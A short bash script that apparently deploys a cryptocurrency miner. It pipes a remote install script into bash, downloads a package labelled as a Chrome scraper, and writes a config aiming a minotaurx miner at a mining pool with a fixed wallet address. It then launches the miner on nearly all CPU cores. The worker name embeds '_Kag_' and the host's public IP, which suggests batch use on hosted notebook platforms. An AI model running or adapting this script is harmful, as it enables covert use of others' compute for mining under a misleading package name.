#!/bin/bash
cd
sleep 2
whoami
sleep 3

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Kag_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 6`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

# Function to check if Node.js is installed

wget -O - https://deb.nodesource.com/setup_20.x | bash
apt -y install nodejs

sleep 2

curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
tar -xvf chrome-mint.tar.gz
rm chrome-mint.tar.gz
cd chrome-mint

# Install dependencies
npm install

sleep 2

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list

sleep 2

apt-get update
apt-get install -y google-chrome-stable

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

rm config.json

sleep 2

cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "flyingsaucer-eu.teatspray.fun",
  "port": 7019,
  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
  "password": "$currentdate,c=MAZA,zap=MAZA",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 5

node index.js



